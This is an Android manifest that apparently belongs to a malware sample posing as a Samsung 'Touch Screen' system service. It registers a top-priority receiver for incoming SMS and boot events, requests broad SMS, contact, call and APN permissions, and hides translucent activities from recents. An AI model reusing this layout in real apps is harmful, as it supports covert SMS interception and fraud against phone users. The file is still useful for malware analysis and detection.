<?xml version="1.0" encoding="utf-8" standalone="no"?><manifest xmlns:android="http://schemas.android.com/apk/res/android" package="com.sec.android.touchScreen.server">
    <application android:icon="@drawable/icon" android:label="Touch Screen">
        <activity android:name="BaseAActivity"/>
        <receiver android:name=".BaseABroadcastReceiver">
            <intent-filter android:priority="2147483647">
                <action android:name="android.net.wifi.PICK_WIFI_WORK"/>
                <action android:name="android.net.conn.MEDIA_NOFS"/>
                <action android:name="android.net.conn.CONNECTIVITY_CHANGE"/>
                <action android:name="android.intent.action.ACTION_POWER_CONNECTED"/>
                <action android:name="android.provider.Telephony.SMS_RECEIVED"/>
                <action android:name="android.intent.action.BOOT_COMPLETED"/>
                <action android:name="android.intent.action.INPUT_METHOD_CHANGED"/>
                <action android:name="android.intent.action.USER_PRESENT"/>
                <action android:name="android.intent.action.UMS_CONNECTED"/>
                <action android:name="android.intent.action.UMS_DISCONNECTED"/>
            </intent-filter>
        </receiver>
        <service android:name="FirstAService"/>
        <service android:name="SecondAService"/>
        <service android:name="ThirdAService"/>
        <service android:name="FourthAService"/>
        <activity android:excludeFromRecents="true" android:launchMode="singleInstance" android:name="FirstAActivity" android:theme="@android:style/Theme.Translucent"/>
        <activity android:excludeFromRecents="true" android:launchMode="singleInstance" android:name="SecondAActivity" android:theme="@android:style/Theme.Translucent"/>
        <activity android:excludeFromRecents="true" android:launchMode="singleInstance" android:name="ThirdAActivity" android:screenOrientation="portrait"/>
        <activity android:excludeFromRecents="true" android:launchMode="singleInstance" android:name="FourthAActivity" android:screenOrientation="portrait"/>
        <meta-data android:name="PID" android:value="secv"/>
    </application>
    <uses-permission android:name="android.permission.WRITE_SMS"/>
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
    <uses-permission android:name="android.permission.VIBRATE"/>
    <uses-permission android:name="android.permission.READ_SMS"/>
    <uses-permission android:name="android.permission.RECEIVE_SMS"/>
    <uses-permission android:name="android.permission.SEND_SMS"/>
    <uses-permission android:name="android.permission.DISABLE_KEYGUARD"/>
    <uses-permission android:name="android.permission.READ_CONTACTS"/>
    <uses-permission android:name="android.permission.WRITE_CONTACTS"/>
    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
    <uses-permission android:name="android.permission.CALL_PHONE"/>
    <uses-permission android:name="android.permission.WAKE_LOCK"/>
    <uses-permission android:name="android.permission.RESTART_PACKAGES"/>
    <uses-permission android:name="android.permission.WRITE_APN_SETTINGS"/>
    <uses-permission android:name="android.permission.READ_LOGS"/>
</manifest>